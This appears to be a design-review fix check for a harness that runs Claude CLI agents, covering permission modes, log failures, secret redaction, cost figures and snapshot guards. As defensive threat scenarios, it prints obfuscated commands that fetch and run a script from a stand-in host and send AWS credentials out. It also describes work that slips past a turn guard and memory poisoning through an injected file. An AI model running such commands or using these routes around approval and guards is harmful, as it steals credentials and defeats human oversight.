# M1 round 1, fix check M1-FC2: the claude channel, logs and where soldiers run (R-M1-24, R-M1-11, R-M1-7, R-M1-12, R-M1-23) in v0.8. All five FIXED; 13 findings on what the fixes broke or left open (FC2-1 to FC2-13), two of them P1 (FC2-3; FC2-6, which confirms R-M1-70). Cut off by the usage limit and resumed in the same session; 409,642 tokens at the end.

**R-M1-24: FIXED**
- evidence: CH-2 :292 now passes `--permission-mode` on every start and resume: `plan` for supervised (`acceptEdits` for a writing turn, →M6), `auto` for auto, `bypassPermissions` for full. That is v1's mapping (src/adapters/claude.ts:13-21). Also CH-7 :330-331, M1-AC5 :704 (the arguments) and M1-AC3 :690 (the mode `system/init` reports). Vendor docs: the flag outranks settings files and the built-in default (https://code.claude.com/docs/en/permission-modes#which-mode-a-session-starts-in); a `-p` resume without the flag starts the way a new `-p` run does (https://code.claude.com/docs/en/sessions#permission-mode-on-resume); `system/init` carries `permissionMode` (https://code.claude.com/docs/en/agent-sdk/typescript).
- reason: A supervised claude soldier can no longer start in `auto` or in a repository's `acceptEdits`, because the explicit flag comes first.
- depends on: D-16 (R-M1-57) may change what supervised passes. "`acceptEdits` for a writing turn" inside one long-lived process needs the mode to change per turn, which D-7 settles (→M6).

FC2-1 (R-M1-24, half done)
- severity: P2
  type: gap
  location: CH-7 (docs/spec/v2.md:331); CH-3 to CH-5 (:303-316); M2-AC11 (:769)
  claim: CH-7 leaves codex's, grok's and agy's permission modes to CH-3 to CH-5, and the ledger says M2-AC11 tests a resume's mode, but none of those lines has either.
  scenario: An M2 builder looks in CH-3 for what supervised, auto and full give codex's `thread/start` and finds nothing. Reading A carries v1's `codex exec` flags (src/adapters/codex.ts:7-14). Reading B passes nothing and takes whatever configuration codex finds. A claude resume that drops `--permission-mode` starts the way a new `-p` run does, which is the hole R-M1-24 closed, and no AC catches it.
  evidence: CH-3 :303-306, CH-4 :307-310 and CH-5 :311-316 name no mode. M2-AC11 :769 checks only the resumed history. Ledger row R-M1-24 says "CH-3 to CH-5 give theirs in M2; M1-AC5 and M2-AC11 test it". https://code.claude.com/docs/en/sessions#permission-mode-on-resume.
  fix: In unit M2, CH-3, CH-4 and CH-5 each say what every autonomy level passes on every start and resume, as CH-2 does. M2-AC11 adds: "the resumed process's arguments carry its level's permission mode, and claude's `system/init` reports it."

FC2-2 (R-M1-24, broke)
- severity: P3
  type: vendor-fact
  location: CH-7 (:331)
  claim: "so the mode never comes from a settings file or the CLI's own default" is false for `auto`: when auto mode isn't available to the session, claude starts in Manual, and a settings file's `disableAutoMode` is one cause.
  scenario: Iron is set to `auto`. The repository commits `.claude/settings.json` with `"disableAutoMode": "disable"`, or the model has no auto mode. Iron runs in Manual, and in M1 everything outside the read-only set is refused (D-15). The roster still says auto, and nothing tells the owner why.
  evidence: https://code.claude.com/docs/en/permission-modes: "When the flag, a settings file, or the built-in default selects `auto` but auto mode isn't available to the session, Claude Code starts the session in Manual instead"; its starting-mode table row: "Any settings file sets `disableAutoMode` to `"disable"`". M1-AC3 :690 reads the mode only from a recording.
  fix: CH-7 adds: "Where the CLI starts in another mode than the one passed, as claude starts in Manual when auto mode isn't available to the session, the soldier's log and one line in Claude's transcript name the mode it reports (claude's `system/init` `permissionMode`)."

**R-M1-11: FIXED**
- evidence: PO-5 :220-223 is now (M1; U, F):
  - a log never stops a soldier or a turn;
  - a failed write is retried once, 100 ms later; after that the post office carries on, reports the failure once on the event stream, and puts one line in Claude's transcript;
  - later writes try again, and the first line after a gap gives the count of lost lines;
  - a cut-off line is ended before the next one, and readers skip lines that don't parse;
  - records are left to MSG-4 (:379, →M3).
  §5.1 F :617 and M1-AC4 :702 give the fault test this outcome.
- reason: The fault case now has an outcome to pass or fail against. Codex's draft must change to match: it closes the post office on any log error (src/v2/postOffice.ts:79-83), refuses later commands (:71) and rethrows the error at the turn's end (:226-227).

FC2-12 (R-M1-11, against D-18's pending repair)
- severity: P2
  type: contradiction
  location: PO-5 (:223); WSP-11 (:503, :505); D-18 (b) as drafted in docs/spec/review/drafts/M1-r1-fc/fc1.txt:48, :55
  claim: D-18's repair makes a turn's opening log line and its on-disk baseline the only way the next post office finds and checks a turn that was cut short, but PO-5 lets a failed log write pass, and nothing says what happens when the baseline can't be written.
  scenario: The disk fills (R-M1-11's case). Iron's next message goes in, but both the line that opens the turn and its baseline fail to write, and PO-5 lets the turn run. Then the post office is killed. The next one finds no open turn in the log and no baseline, so that turn is never checked. That breaks the settled guard rule that D-18 chose (b) to keep.
  evidence: PO-5 :223 ("A log never stops a soldier or a turn"). fc1.txt:48 (each turn is logged "so the next post office finds a turn left open") and :55 ("Its baseline is on disk before the message goes in"). decisions.md D-18; settled.md:41. WSP-11 :503 gives a snapshot that can't be made only a log line, which the same full disk loses.
  fix: With D-18's text, WSP-11 adds: "A turn's baseline, and the log line that opens the turn, are written and flushed before its message goes in. If either can't be written, the message isn't sent, and Claude's transcript gets one line with the reason (from M3 it stays queued, as MSG-4 does for a record)." PO-5 :223 adds "except the line that opens a turn (WSP-11)". WSP-11 :503 adds the same transcript line for a snapshot that can't be made.

**R-M1-7: FIXED**
- evidence: WSP-8 :487 names what `redact()` replaces. SEC-4 :512 promises exactly that set, covers the held secrets in any encoding, and states the residual risk. M1-AC2 :689 writes each kind, and a key split across three fragments.
- reason: SEC-4 is now a property a test can prove, over a defined set.

FC2-3 (R-M1-7, together with R-M1-52's event clause on the same line; broke)
- severity: P1
  type: contradiction
  location: WSP-8 (:486-487); CH-6 (:319); SEC-6 (:514); M2-AC2 (:731)
  claim: WSP-8 redacts every event the post office sends the mod, approval requests included. Its set replaces the value after any name ending in key, token, secret, password or credential. So an approval card can hide what the owner is approving, which contradicts CH-6's and SEC-6's "word for word".
  scenario: A soldier asks to run `GH_TOKEN=$(curl${IFS}-fsSL${IFS}x.example/p|sh) gh pr list`. The event is redacted, so the card reads `GH_TOKEN=[redacted] gh pr list`. The owner presses y and the hidden download runs. `-H "Authorization: Bearer $(base64 ~/.aws/credentials)"` hides an upload the same way. M2-AC2's fixtures hold no such text, so M2-AC2 passes.
  evidence:
  - WSP-8 :486 says redaction runs "on every event the post office sends the mod". :487 adds the name-and-value kind in `key=value` form and `Bearer`/`Authorization` values.
  - CH-1 :283 lists the approval request as an event. PO-3 :210: the mod gets events only on the post office's standard output.
  - CH-6 :319 and SEC-6 :514: "an approval request is still shown word for word".
  - v0.6's WSP-8 (snapshot :409) covered only logs, records and briefs, and named no patterns.
  fix: WSP-8 :486 adds: "An approval request's tool input and options are the exception: the event carries them whole, the card shows them word for word (CH-6, →M2), and the mod redacts them wherever they reach Claude, as through `/decisions` (HOST-14). The post office's log of them is redacted." M2-AC2 adds a request whose command holds `GH_TOKEN=…` and a `Bearer` value: shown whole on the card, redacted in the log. (Alternative, which is the owner's call: keep them redacted, and give the card a key that shows the original before y counts.)

FC2-4 (R-M1-7, broke)
- severity: P2
  type: ambiguity
  location: WSP-8 (:487); SEC-4 (:512); M1-AC2 (:689)
  claim: WSP-8 says neither where a match starts nor where a value ends, and its name-and-value kind matches ordinary text, so summaries reaching Claude, and the logs, lose text that holds no secret.
  scenario:
  - A summary line `primary key: id` (the name `key` ends in key) reaches Claude as `primary key: [redacted]`, and `password: at least 12 characters` loses its rule.
  - With no word boundary, claude's `"kind":"task-notification"` contains `sk-` plus 12 letters, so the log shows `"ta[redacted]"`.
  - Reading A ends a value at whitespace; reading B ends it at the end of the line and swallows the rest.
  - The unit test only has cases that must be replaced, so both readings pass.
  evidence: WSP-8 :487 ("a key that starts `sk-` … followed by at least 12 more letters"; "the value given to a name that ends in `key` …"). MSG-5 :384 (summaries enter Claude's conversation) with WSP-8 :486 (events are redacted). CH-2 :294 (`task-notification`). SEC-4 :512 says the held secrets "in any encoding", while WSP-8 :487 says "in any letter case".
  fix: WSP-8 :487 adds:
  - "Each kind matches only at a word boundary."
  - "A name is an identifier with no spaces. Its value has at least 8 characters and no space, and ends at whitespace, a quote, `,`, `;`, `}` or the end of the line."
  - "The held secrets match in each encoding Shadow Army uses for them, in any letter case (SEC-4)."
  - "For each kind the unit test also has a case that must be kept, such as `input_tokens: 5`, `primary key: id` and `task-notification`."

FC2-11 (R-M1-7, half done)
- severity: P3
  type: untestable
  location: SEC-4 (:512); M1-AC2 (:689)
  claim: M1-AC2 writes each kind "to a log and a record", but records are PO-6's (M3), and neither line marks them →M3.
  scenario: M1 has no records to write to, so M1-AC2's record half can't pass unless the builder invents an M1 record for the test.
  evidence: PO-6 :224 is M3. PO-5 :223 says "Records are not logs … (→M3)". PO-1 :204 cites "(PO-6, →M3)". Appendix B rule 8 is at :934.
  fix: SEC-4 :512: "Logs, and records (PO-6, →M3), hold nothing…". M1-AC2 tests the log half, and an M3 AC adds the record half.

**R-M1-12: FIXED**
- evidence: CH-2 :298-302 ("A turn's own figures"); OBS-3 :563; M1-AC3 :690 (three turns whose figures add up to the last result's totals); M1-AC4 :694 (a crash's zeroed result reads "not reported"); §5.1 L :624. The 2.1.277 minimum at :290 matches the docs: "Before v2.1.277, a session that you resumed through the SDK or `claude -p` started its totals at zero" (https://code.claude.com/docs/en/agent-sdk/cost-tracking).
- reason: No running total is added up any more, and a crashed turn reads "not reported" instead of $0.

FC2-5 (R-M1-12, half done)
- severity: P2
  type: ambiguity
  location: CH-2 (:298-301); OBS-3 (:563)
  claim: After a zero or falling total, CH-2 sets the next result's cost but not its tokens, so those can be a difference that counts an earlier turn a second time.
  scenario: In one process, turn 1 ends with result R1, turn 2 is stopped and its result is all zero, and turn 3 ends with R3.
  - Reading A: turn 3's tokens are R3's `modelUsage` less R1's. That includes turn 2's tokens, while :301 already summed turn 2's main-loop input and cache, so SES-7 counts them twice.
  - Reading B: turn 3 has no result before it (:299), so its tokens are main-loop only.
  - A `/clear` sent as a message gives a falling total. Claude starts its totals over there, so that result's own totals are its figures, but CH-2 gives it none.
  evidence:
  - CH-2 :298 ("less those of the result before it"), :300 ("the next result's cost also reads 'not reported'"), :301 ("never the result before the next turn"); OBS-3 :563 ("per-model figures, which count subagents").
  - https://code.claude.com/docs/en/agent-sdk/cost-tracking: "The running totals start over each time your app sends one of those three commands"; the `/clear` turn's own result "covers only what has run since the reset".
  - Spike S6 recorded only that a stop's `usage` is all zeros (C:\Users\johns\projects\AIConnections\.shadow\v2-tools\review\evidence\s6-results.md:7). It did not record `total_cost_usd` or `modelUsage`, yet :301 says "as after … a stop (spike S6)".
  fix: CH-2 :300 reads: "A zero total is never a baseline: the next result has no result before it, so its cost reads 'not reported', its tokens are its main-loop ones, and its totals become the baseline. A falling total means claude started its totals over (`/clear`, `/reset` or `/new`): that result's own totals are its figures, and it is the next baseline." OBS-3 adds "except a turn whose figures are its main-loop ones (CH-2)". Whether a stop zeroes `total_cost_usd` and `modelUsage` is NEEDS-PROBE in S6's recording (M2); until then :301 says "after a crash, and after a stop where the recording shows it".

FC2-10 (R-M1-12, broke)
- severity: P3
  type: editorial
  location: CH-2 (:290)
  claim: The version bullet repeats a phrase: "where a field this adapter reads needs one where a field this adapter reads needs one".
  scenario: none.
  evidence: CH-2 :290. The draft docs/spec/review/drafts/M1-r1/m1-g1-ch2.txt:3 has it too.
  fix: "A later version is needed where a field this adapter reads needs one; each such need is named beside its rule…"

**R-M1-23: FIXED**
- evidence: WSP-11 :501-505; CH-1 :282; glossary :76; Appendix A :911; M1 Implements :673; M1-AC11 :715-721. This matches settled decision 7 (settled.md:28) and the design rule at :41.
- reason: M1 now says that every session runs in a throwaway snapshot of HEAD, never in the folder, and that a guard fails any turn that changes the checkout.

FC2-6 (R-M1-23, broke; this is R-M1-70, confirmed and widened)
- severity: P1 (R-M1-70 had P2): as written, the first snapshot already holds harness git.
  type: contradiction
  location: WSP-11 (:501, :505); WSP-10 (:498-500); ARM-6 (:464)
  claim: Shadow Army's own snapshots are git worktrees, and both WSP-10's check and WSP-11's guard treat their metadata as untrusted. So the first snapshot holds harness git, and one soldier's session opening fails another soldier's turn. The settled rule exempts Shadow Army's own worktrees.
  scenario:
  - The post office opens Iron's session. Harness git runs `git worktree add --detach` (v1's `createSnapshot`), which adds `.git/worktrees/<snapshot>/`.
  - After that command, WSP-10 compares each worktree's metadata with its state when the post office started, finds a change, and holds harness git until the post office restarts (:499-500). The guard can't run, and no other soldier can start.
  - Even if a builder trusts its own command there, Kaisel's session opening, restarting or closing during Iron's turn changes metadata that Iron's guard hashes, and Iron's turn fails.
  - If "metadata" means all of `.git/worktrees/<n>/`, a `git status` that a soldier runs in its own snapshot can rewrite that snapshot's index and fail its own turn.
  evidence:
  - WSP-11 :501 ("made by harness git (WSP-10)") and :505 (it covers "the paths that ARM-6 (→M2) hashes"; "any change it finds fails the turn"). ARM-6 :464 hashes "each worktree's metadata".
  - WSP-10 :498 trusts only "their state when the post office started, or as the owner last accepted it".
  - Its source, 2.0 GIT-3 (docs/legacy/spec/shadow-army-2.0.md:1053-1060), took the baseline "at chat start or when the workspace is created". It checked only `.git/worktrees/<n>/{gitdir,commondir,config.worktree}`, and checked a workspace's HEAD "against the commit the harness expects, not hashed".
  - settled.md:41.
  - v1's guard (src/workspace/guard.ts:23-56) and Codex's draft (src/v2/postOffice.ts:202) hash no worktree metadata, so neither shows the problem yet. v1's snapshot: src/workspace/worktree.ts:48-63.
  - M1-AC11 :715-721 runs only one soldier.
  - This doesn't depend on D-7: every D-7 option keeps a snapshot or worktree per soldier.
  fix: WSP-10 :498: "…their state when the post office started, as Shadow Army's own command left it when it made or removed a snapshot or worktree, or as the owner last accepted it. A worktree's metadata is its `gitdir`, `commondir` and `config.worktree`; the HEAD of Shadow Army's own snapshots and worktrees is checked against the commit it expects (2.0 GIT-3)." ARM-6 :464 and WSP-11 :505 use that meaning, and WSP-11 adds: "Shadow Army's own snapshots, worktrees and files under `.shadow/v2/` are not the checkout; a change in the soldier's own snapshot is a write there." M1-AC11 adds a second soldier whose session opens, restarts and closes during the first soldier's turn: harness git is never held, and the first turn passes.

FC2-7 (R-M1-23, broke)
- severity: P2
  type: defect
  location: WSP-11 (:501); §5.1 L (:621-625); VER-9 (:644); M1-AC8 (:707)
  claim: Because the snapshot is nested under the folder, a claude soldier loads the folder's own CLAUDE.md and CLAUDE.local.md on top of the snapshot's CLAUDE.md, since claude reads them from every directory above its working directory.
  scenario: In a clean checkout of this repository, Iron runs in `<folder>/.shadow/v2/<snapshot>/`, so every request carries the project's CLAUDE.md twice. In daily use it also carries the owner's private CLAUDE.local.md and any uncommitted CLAUDE.md edits, which a HEAD snapshot was meant to keep out. VER-9's live run pays for the second copy on every request; the headless run in the checkout doesn't. So the 1.05 bar also measures where the snapshot sits (claude passed at -3.8% on 2026-10-07).
  evidence: https://code.claude.com/docs/en/memory: "Claude Code loads `CLAUDE.md` and `CLAUDE.local.md` from your current working directory and every directory above it". WSP-11 :501 ("under `.shadow/v2/`"); §5.1 L :621 (the headless run in the checkout); decisions.md, "Values set in the fix pass", the pass rule's row. A probe (`/context` in such a session) can count the copies.
  fix: WSP-11 :501: "…in its own throwaway snapshot of HEAD, made outside the folder's directory tree in a folder of Shadow Army's own, named for the folder and the session". M1-AC11 :716 changes to match. At the least, §5.1 L runs the headless run from a snapshot made the same way.

FC2-8 (R-M1-23, half done)
- severity: P2
  type: gap
  location: WSP-11 (:501-504); PO-1 (:196); M1-AC11 (:717, :720)
  claim: WSP-11 reports a snapshot's writes "before its next turn" and removes the snapshot "when it closes", so neither happens for the old snapshot after an M1 restart, nor for a session's last turn.
  scenario: Iron writes `notes.md` in its snapshot and crashes mid-turn. M1 restarts it in a fresh session with a new snapshot (:196, :502). The old snapshot never closes and has no next turn. Reading A removes it at the restart with no report. Reading B keeps it: a full copy of the checkout and a registered worktree for every crash. A normal close right after a turn that wrote files has the same gap.
  evidence:
  - WSP-11 :501 ("removed when it closes"), :502 and :504 ("discarded before its next turn and reported").
  - M1-AC11 :717 and :720 test only the new snapshot and a normal close.
  - Codex's draft reuses the session's snapshot across restarts (src/v2/postOffice.ts:131, :142).
  - R-M1-65 already covers a post office that ended without closing its channels.
  fix: WSP-11 :504: "A file it writes in its snapshot is found once each turn is over, reported then as a read-violation, and discarded before the next turn. When a restart opens a fresh session (PO-1), the old snapshot's files are reported the same way and the old snapshot is removed." M1-AC11 adds a crash after a write in the snapshot, and a close right after a turn that wrote one.

FC2-9 (R-M1-23, half done)
- severity: P2
  type: gap
  location: WSP-11 (:505); M1-AC11 (:719)
  claim: M1's guard closes at the turn's end event, so work the turn leaves running can change the checkout unguarded until PO-8 arrives in M2. v1 didn't have this gap.
  scenario: Kaisel, at `auto`, starts a background command that waits 20 s and then rewrites `src/core/assign.ts` in the folder by its absolute path. The `result` comes first, and the guard closes clean. The write lands either between turns, which M1-AC11 says raises nothing, or during a later turn, which then fails for a change it didn't make.
  evidence:
  - WSP-11 :505: the guard runs "until its end event, or until its process tree has been ended".
  - PO-8 :253-259: background work keeps the guard open, but only from M2.
  - settled.md:41: the guard "fails any task during which something … changed".
  - https://code.claude.com/docs/en/headless: "After Claude finishes its turn and stdin has closed, a `claude -p` run can stay open to wait for background work that Claude started".
  - v1's one-shot run closed stdin and its guard ran after the process exited (src/adapters/claude.ts:49-51; src/core/summon.ts:151-161).
  fix: WSP-11 :505 adds: "Until PO-8 (→M2), the guard also stays open past the end event while a task the turn started is running (claude's `task_started` with no `task_notification` yet), or while a process that joined the tree during the turn hasn't exited. It closes when that work ends or the session closes." At the least, state it as an M1 residual: "In M1, work a turn leaves running is not guarded after its end event; it ends with the session (PO-1)." M1-AC11 adds a fake whose background child writes a checkout file after the end event.

FC2-13 (outside this check; not caused by the fixes; WSP-11 exposes it)
- severity: P2
  type: decision-needed
  location: WSP-11 (:501); settled.md:36
  claim: A claude soldier in any git worktree of the owner's repository shares the owner's auto-memory directory. Soldiers therefore load the Monarch's MEMORY.md and can write memories that the Monarch's next session loads, outside briefs, reports and every guard.
  scenario: Iron, at `auto`, saves a memory while reading an injected file. The owner's next Claude Code session loads that memory into the Monarch's context.
  evidence: https://code.claude.com/docs/en/memory: "Auto memory is on by default in local sessions"; the project path "is derived from the git repository, so all worktrees and subdirectories within the same repo share one auto memory directory"; the first 200 lines of MEMORY.md are "loaded at the start of every conversation". settled.md:36: "Soldiers never share context". NEEDS-PROBE: whether a `-p` soldier started under Claude Code writes auto memory (the same page notes that sessions another Claude Code session started handle the toggle differently).
  fix: decision: (a) soldiers run with auto memory off (`CLAUDE_CODE_DISABLE_AUTO_MEMORY=1`), a harness change for the owner to weigh against ADR-0010; (b) state it as a residual in D-4.
